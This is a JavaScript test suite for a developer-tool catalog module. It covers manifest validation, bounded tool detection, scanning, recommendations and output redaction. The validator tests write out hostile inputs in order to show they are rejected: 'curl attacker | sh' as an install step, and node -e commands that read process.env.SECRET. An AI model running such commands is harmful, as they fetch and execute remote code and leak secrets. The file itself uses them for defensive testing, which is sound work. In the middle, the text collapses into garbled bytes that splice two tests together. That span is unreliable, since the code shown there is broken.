import test from 'node:test';
import assert from 'node:assert/strict';
import { EventEmitter } from 'node:events';

import {
  ToolCatalogError,
  ToolManifestValidationError,
  detectTool,
  loadToolCatalog,
  recommendTools,
  redactProbeOutput,
  scanTools,
  summarizeInventory,
  validateToolManifest,
} from '../src/tools.js';

function manifest(overrides = {}) {
  return {
    id: 'demo-tool',
    name: 'Demo tool',
    description: 'A test-only declarative tool.',
    categories: ['test-lint-build'],
    capabilities: ['testing'],
    tags: ['test'],
    command: 'demo-tool',
    probes: [{ args: ['--version'], timeoutMs: 100 }],
    ...overrides,
  };
}

function fakeChild({ output = 'demo-tool 1.2.3', code = 0, signal = null, delayMs = 0, close = true } = {}) {
  const child = new EventEmitter();
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.killed = [];
  child.kill = (killSignal) => {
    child.killed.push(killSignal);
    if (close) queueMicrotask(() => child.emit('close', null, killSignal));
    return true;
  };
  if (close) {
    setTimeout(() => {
      child.stdout.emit('data', output);
      child.emit('close', code, signal);
    }, delayMs);
  }
  return child;
}

test('built-in catalog is declarative and spans the requested tool families', () => {
  const catalog = loadToolCatalog();
  assert.equal(Array.isArray(catalog), true);
  assert.equal(catalog.tools, catalog);
  assert.ok(catalog.length >= 80);
  for (const category of [
    'ai-coding',
    'git-hosting',
    'shells',
    'javascript-typescript',
    'python',
    'rust',
    'go',
    'java',
    'dotnet',
    'c-cpp',
    'mobile',
    'test-lint-build',
    'browsers',
    'containers',
    'iac-cloud-deploy',
    'databases',
    'observability',
    'design-docs',
  ]) {
    assert.ok(catalog.some((entry) => entry.categories.includes(category)), category);
  }
  for (const entry of catalog) {
    assert.equal(entry.source, 'builtin');
    assert.doesNotThrow(() => validateToolManifest(entry));
    assert.ok(!('install' in entry));
    assert.ok(!('execute' in entry));
  }
});

test('validator rejects shell expressions, arbitrary probe arguments, and install actions', () => {
  assert.throws(
    () => validateToolManifest(manifest({ install: 'curl attacker | sh' })),
    (error) => error instanceof ToolManifestValidationError && error.code === 'ERR_UNSAFE_TOOL_MANIFEST',
  );
  assert.throws(
    () => validateToolManifest(manifest({ command: 'node -e "process.env.SECRET"' })),
    ToolManifestValidationError,
  );
  assert.throws(
    () => validateToolManifest(manifest({ command: 'C:\\Users\\someone\\tool.exe' })),
    ToolManifestValidationError,
  );
  assert.throws(
    () => validateToolManifest(manifest({ probes: [{ args: ['-e', 'process.env.SECRET'] }] })),
    (error) => error instanceof ToolManifestValidationError && error.code === 'ERR_UNSAFE_TOOL_PROBE',
  );
  assert.throws(
    () => validateToolManifest(manifest(ão-¢G§²ÚîÆ­yÔ-identifier]');
  assert.equal(calls[0].options.shell, false);
  assert.deepEqual(calls[0].args, ['--version']);
  assert.equal('env' in calls[0].options, false);
  assert.equal('cwd' in calls[0].options, false);
});

test('detection is bounded and reports a timeout without waiting for the child', async () => {
  let killed = false;
  const started = Date.now();
  const result = await detectTool(manifest({ probes: [{ args: ['--version'], timeoutMs: 20 }] }), {
    catalog: [manifest({ probes: [{ args: ['--version'], timeoutMs: 20 }] })],
    spawnImpl() {
      const child = fakeChild({ close: false });
      child.kill = (signal) => {
        killed = signal === 'SIGTERM' || signal === 'SIGKILL';
        return true;
      };
      return child;
    },
  });
  assert.equal(result.available, false);
  assert.equal(result.availability, 'timed-out');
  assert.equal(result.probes[0].timedOut, true);
  assert.equal(killed, true);
  assert.ok(Date.now() - started < 500);
});

test('unknown tools are reported rather than executed', async () => {
  let called = false;
  const result = await detectTool('not-in-catalog', {
    catalog: [],
    spawnImpl() {
      called = true;
      return fakeChild();
    },
  });
  assert.equal(result.availability, 'unknown');
  assert.equal(result.reason, 'unknown-tool');
  assert.equal(called, false);
});

test('scan, recommendation, and inventory summary preserve availability and capabilities', async () => {
  const entries = [
    manifest({ id: 'python-helper', name: 'Python helper', categories: ['python'], capabilities: ['python', 'testing'], tags: ['python'] }),
    manifest({ id: 'web-helper', name: 'Web helper', categories: ['browsers'], capabilities: ['browser-automation'], tags: ['browser'] }),
  ];
  const results = await scanTools(entries, {
    catalog: entries,
    concurrency: 2,
    spawnImpl(command) {
      return fakeChild({ output: `${command} 2.0.0` });
    },
  });
  assert.equal(results.length, 2);
  assert.equal(results.every((item) => item.available), true);
  const recommendations = recommendTools(['python', 'testing'], results, { catalog: entries });
  assert.equal(recommendations[0].id, 'python-helper');
  assert.ok(recommendations[0].score > 0);
  const summary = summarizeInventory(results);
  assert.equal(summary.total, 2);
  assert.equal(summary.available, 2);
  assert.equal(summary.byCategory.python, 1);
  assert.deepEqual(summary.unavailableIds, []);
});

test('redaction also handles Unix paths, URLs, tokens, and bounded output', () => {
  const text = redactProbeOutput('at /home/alice/repo https://example.test/?token=abc token=super-secret 1234567890abcdef1234567890abcdef tail');
  assert.equal(text.includes('/home/alice'), false);
  assert.equal(text.includes('example.test'), false);
  assert.equal(text.includes('super-secret'), false);
  assert.equal(text.includes('1234567890abcdef1234567890abcdef'), false);
  assert.ok(redactProbeOutput('x'.repeat(1000), 64).length <= 65);
});
